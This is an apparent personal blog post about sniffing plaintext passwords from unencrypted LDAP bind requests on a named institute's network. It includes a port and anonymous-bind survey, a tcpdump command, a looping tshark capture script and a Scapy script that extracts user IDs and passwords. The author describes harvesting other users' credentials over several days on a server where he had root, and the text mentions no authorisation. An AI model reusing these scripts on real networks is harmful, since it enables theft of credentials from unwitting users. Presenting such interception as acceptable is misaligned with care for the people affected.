<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="In this blog, Iâ€™ll share how I retrieved plaintext passwords by intercepting unencrypted LDAP Bind Requests on a remote server where I gained root access.">
<title>Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests</title>

<link rel='canonical' href='http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests">
<meta property='og:description' content="In this blog, Iâ€™ll share how I retrieved plaintext passwords by intercepting unencrypted LDAP Bind Requests on a remote server where I gained root access.">
<meta property='og:url' content='http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/'>
<meta property='og:site_name' content='Gill.Singh.A'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='cybersecurity' /><meta property='article:tag' content='infosec' /><meta property='article:tag' content='network' /><meta property='article:tag' content='sniffing' /><meta property='article:tag' content='tcpdump' /><meta property='article:tag' content='tshark' /><meta property='article:tag' content='wireshark' /><meta property='article:tag' content='ldap' /><meta property='article:published_time' content='2024-09-28T07:09:31&#43;05:30'/><meta property='article:modified_time' content='2024-09-28T07:09:31&#43;05:30'/><meta property='og:image' content='http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis.png' />
<meta name="twitter:title" content="Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests">
<meta name="twitter:description" content="In this blog, Iâ€™ll share how I retrieved plaintext passwords by intercepting unencrypted LDAP Bind Requests on a remote server where I gained root access."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis.png' />
    <link rel="shortcut icon" href="/favicon.jpg" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu14711219647349942965.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ðŸ¤–</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Gill.Singh.A</a></h1>
            <h2 class="site-description">Undergraduate Student at IIT Kanpur</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/Gill-Singh-A'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://x.com/Gill_Singh_A'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#ldap-servers-on-network">LDAP Servers on Network</a></li>
    <li><a href="#ldap-anonymous-bind">LDAP Anonymous Bind</a></li>
    <li><a href="#computer-center-ldap-server">Computer Center LDAP Server</a></li>
    <li><a href="#network-traffic-capture">Network Traffic Capture</a></li>
    <li><a href="#network-traffic-analysis">Network Traffic Analysis</a></li>
    <li><a href="#capturing-using-tshark">Capturing using tshark</a></li>
    <li><a href="#extracting-passwords-from-capture-file">Extracting Passwords from Capture File</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/">
                <img src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis_hu18191812705704103446.png"
                        srcset="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis_hu18191812705704103446.png 800w, /p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis_hu2447085234740769932.png 1600w"
                        width="800" 
                        height="322" 
                        loading="lazy"
                        alt="Featured image of post Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/cybersecurity/" >
                Cybersecurity
            </a>
        
            <a href="/categories/infosec/" >
                Infosec
            </a>
        
            <a href="/categories/network/" >
                Network
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/">Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            In this blog, Iâ€™ll share how I retrieved plaintext passwords by intercepting unencrypted LDAP Bind Requests on a remote server where I gained root access.
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Sep 28, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    3 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="ldap-servers-on-network">LDAP Servers on Network
</h2><p>I decided to investigate the LDAP servers within my institute&rsquo;s private network, which utilizes Class B private IP addresses.<br />
I employed <a class="link" href="https://github.com/Gill-Singh-A/Port-Scanner"  target="_blank" rel="noopener"
    >Gill-Singh-A/Port-Scanner</a> to scan for LDAP ports (389, 636, 3268, 3269) and discovered 49 devices with at least one of these ports open.<br />
<img src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/port_scan.png"
	width="1131"
	height="619"
	srcset="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/port_scan_hu5214438431600738618.png 480w, /p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/port_scan_hu7060229708197509510.png 1024w"
	loading="lazy"
	
		alt="LDAP Port Scan"
	
	
		class="gallery-image" 
		data-flex-grow="182"
		data-flex-basis="438px"
	
></p>
<h2 id="ldap-anonymous-bind">LDAP Anonymous Bind
</h2><p>Following that, I used <a class="link" href="https://github.com/Gill-Singh-A/LDAP-Anonymous-Bind-Checker"  target="_blank" rel="noopener"
    >Gill-Singh-A/LDAP-Anonymous-Bind-Checker</a> to assess LDAP Anonymous Bind support, finding that 32 devices allowed anonymous binding.<br />
<img src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_anonymous_bind_check.png"
	width="1217"
	height="619"
	srcset="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_anonymous_bind_check_hu11417373108919641133.png 480w, /p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_anonymous_bind_check_hu7436161976449918966.png 1024w"
	loading="lazy"
	
		alt="LDAP Anonymous Bind Check"
	
	
		class="gallery-image" 
		data-flex-grow="196"
		data-flex-basis="471px"
	
><br />
After some exploration, I discovered the LDAP server responsible for managing authentication requests for our Computer Centerâ€™s credentials.<br />
The server was identified by the hostname <strong>ldap.cc.iitk.ac.in</strong>, supported LDAP Anonymous Bind.</p>
<h2 id="computer-center-ldap-server">Computer Center LDAP Server
</h2><p>After manually exploring <strong>ldap.cc.iitk.ac.in</strong>, I discovered that I could retrieve any studentâ€™s mobile number using a simple search query.<br />
<img src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/cc_ldap_student_info.png"
	width="1058"
	height="914"
	srcset="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/cc_ldap_student_info_hu6706158349291098143.png 480w, /p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/cc_ldap_student_info_hu14491039418514966273.png 1024w"
	loading="lazy"
	
		alt="CC LDAP Student Information"
	
	
		class="gallery-image" 
		data-flex-grow="115"
		data-flex-basis="277px"
	
><br />
However, what truly alarmed me was that the server was not utilizing SSL for data transmission over the network. This meant that all Computer Center credentials used for authenticating to services like Web Mail and SSH servers were being transmitted as plaintext, making them easily accessible to anyone intercepting the traffic.<br />
<img src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_authentication.png"
	width="1763"
	height="863"
	srcset="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_authentication_hu7729842253027930951.png 480w, /p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_authentication_hu1957787686004190964.png 1024w"
	loading="lazy"
	
		alt="LDAP Authentication"
	
	
		class="gallery-image" 
		data-flex-grow="204"
		data-flex-basis="490px"
	
></p>
<h2 id="network-traffic-capture">Network Traffic Capture
</h2><p>To verify my suspicions, I launched <strong>tcpdump</strong> on a remote server at our institute where I had root access and where users can SSH in using their Computer Center credentials. I began intercepting the network traffic on that server. Specifically, I filtered for port 389 to capture only LDAP traffic.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/sbin/tcpdump -s <span class="m">65535</span> -w network_traffic_capture.pcap <span class="s1">&#39;tcp port 389 and src 172.31.1.148 and dst 172.31.1.1&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After successfully logging into the server using my Computer Center credentials on another terminal, I stopped the network capture and downloaded the pcap file for further analysis.</p>
<h2 id="network-traffic-analysis">Network Traffic Analysis
</h2><p>After opening the pcap file in <strong>Wireshark</strong> and conducting some analysis, I was able to find my Computer Center user ID and password in plaintext within an LDAP Bind Request.<br />
<img src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis.png"
	width="1723"
	height="694"
	srcset="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis_hu15684315963115790267.png 480w, /p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis_hu6391675548106611853.png 1024w"
	loading="lazy"
	
		alt="Network Traffic Analysis"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="595px"
	
><br />
This confirmed my suspicions: the Computer Center credentials were indeed transmitted as plaintext.</p>
<h2 id="capturing-using-tshark">Capturing using tshark
</h2><p>Next, I created a simple bash script that utilized <strong>tshark</strong> to capture LDAP network traffic on the server and save it into a pcap file. The script processes the pcap file once it reaches 100 MB, filtering to include only LDAP Bind Requests and storing the results in my NFS (Network File System) Directory.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#! /bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">index</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">	/usr/sbin/tshark -w webhome.pcap -i <span class="m">1</span> -f <span class="s2">&#34;tcp port 389 and host 172.31.1.148 and dst host 172.31.1.1&#34;</span> -a filesize:100000
</span></span><span class="line"><span class="cl">	/usr/sbin/tshark -r webhome.pcap -R <span class="s2">&#34;frame contains \&#34;ou=People,dc=iitk,dc=ac,dc=in\&#34; and ldap.bindRequest&#34;</span> -w webhome_filtered_<span class="si">${</span><span class="nv">index</span><span class="si">}</span>.pcap
</span></span><span class="line"><span class="cl">	chmod <span class="m">600</span> webhome_filtered_<span class="si">${</span><span class="nv">index</span><span class="si">}</span>.pcap
</span></span><span class="line"><span class="cl">	rm -f webhome.pcap
</span></span><span class="line"><span class="cl">	<span class="o">((</span>index++<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="extracting-passwords-from-capture-file">Extracting Passwords from Capture File
</h2><p>After collecting LDAP Bind Requests for some days, I downloaded the processed capture file and created a simple Python script using <a class="link" href="https://scapy.net/"  target="_blank" rel="noopener"
    >Scapy</a> to extract the user IDs and their corresponding passwords. This allowed me to determine how many credentials I had successfully retrieved.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#! /usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="n">rdpcap</span><span class="p">,</span> <span class="n">LDAP_BindRequest</span><span class="p">,</span> <span class="n">TCP</span><span class="p">,</span> <span class="n">LDAP</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">packets</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>              <span class="c1"># argv[1] Network Capture File (.pcap)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">pkt</span> <span class="ow">in</span> <span class="n">packets</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">LDAP_BindRequest</span> <span class="ow">in</span> <span class="n">pkt</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">][</span><span class="n">LDAP</span><span class="p">][</span><span class="n">LDAP_BindRequest</span><span class="p">]</span><span class="o">.</span><span class="n">authentication</span><span class="o">.</span><span class="n">val</span> <span class="o">!=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">CYAN</span><span class="si">}{</span><span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">][</span><span class="n">LDAP</span><span class="p">][</span><span class="n">LDAP_BindRequest</span><span class="p">]</span><span class="o">.</span><span class="n">bind_name</span><span class="o">.</span><span class="n">val</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="se">\t</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RESET</span><span class="si">}</span><span class="s2">=&gt;</span><span class="se">\t</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">][</span><span class="n">LDAP</span><span class="p">][</span><span class="n">LDAP_BindRequest</span><span class="p">]</span><span class="o">.</span><span class="n">authentication</span><span class="o">.</span><span class="n">val</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RESET</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The following was the output<br />
<img src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/passwords_extracted.png"
	width="938"
	height="254"
	srcset="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/passwords_extracted_hu15989953465181069283.png 480w, /p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/passwords_extracted_hu13346716360919305969.png 1024w"
	loading="lazy"
	
		alt="Extraced Passwords"
	
	
		class="gallery-image" 
		data-flex-grow="369"
		data-flex-basis="886px"
	
><br /></p>
<h2 id="conclusion">Conclusion
</h2><p>This investigation revealed significant security concerns regarding the transmission of sensitive data over unencrypted connections. It&rsquo;s crucial to implement proper security measures to protect user information in our digital landscape.<br />
As we navigate our digital landscape, itâ€™s essential to ensure that proper security measures are in place to protect user information.</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/cybersecurity/">Cybersecurity</a>
        
            <a href="/tags/infosec/">Infosec</a>
        
            <a href="/tags/network/">Network</a>
        
            <a href="/tags/sniffing/">Sniffing</a>
        
            <a href="/tags/tcpdump/">Tcpdump</a>
        
            <a href="/tags/tshark/">Tshark</a>
        
            <a href="/tags/wireshark/">Wireshark</a>
        
            <a href="/tags/ldap/">Ldap</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/building-a-heat-map-for-iit-kanpurs-computer-labs/">
        
        
            <div class="article-image">
                <img src="/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/heat_map_webhome.bebd623764bb8a0f1f52a6f80d8ffd09_hu1036151301471299423.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Building a Heat Map for IIT Kanpur&#39;s Computer Labs"
                        
                        data-hash="md5-vr1iN2S7ig8fUqb4DY/9CQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Building a Heat Map for IIT Kanpur&#39;s Computer Labs</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/getting-remote-root-shell-on-devices-via-portainer/">
        
        
            <div class="article-image">
                <img src="/p/getting-remote-root-shell-on-devices-via-portainer/assets/images/main_image.4c459b92c425fc59dceb815826706cc8_hu7743102481193174317.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Getting Remote Root Shell on Devices via Portainer"
                        
                        data-hash="md5-TEWbksQl/Fnc64FYJnBsyA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Getting Remote Root Shell on Devices via Portainer</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/compromising-cctvs-101/">
        
        
            <div class="article-image">
                <img src="/p/compromising-cctvs-101/assets/images/main_image.081582ce84d9bc3e317e8da88b24bf82_hu13858725307311463504.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Compromising CCTVs 101"
                        
                        data-hash="md5-CBWCzoTZvD4xfo2oiyS/gg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Compromising CCTVs 101</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/password-cracking/">
        
        
            <div class="article-image">
                <img src="/p/password-cracking/assets/images/password_cracking.79f98a0b75b758901058088bbb8a0d71_hu9817960379922058309.jpeg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Password Cracking"
                        
                        data-hash="md5-efmKC3W3WJAQWAiLu4oNcQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Password Cracking</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/using-social-engineering-for-privilege-escalation/">
        
        
            <div class="article-image">
                <img src="/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt.96a76d9f0e028439a1e19ce7a3733583_hu18266772748336865404.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Using Social Engineering for Privilege Escalation"
                        
                        data-hash="md5-lqdtnw4ChDmh4Zzno3M1gw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Using Social Engineering for Privilege Escalation</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 Gill.Singh.A
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.27.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
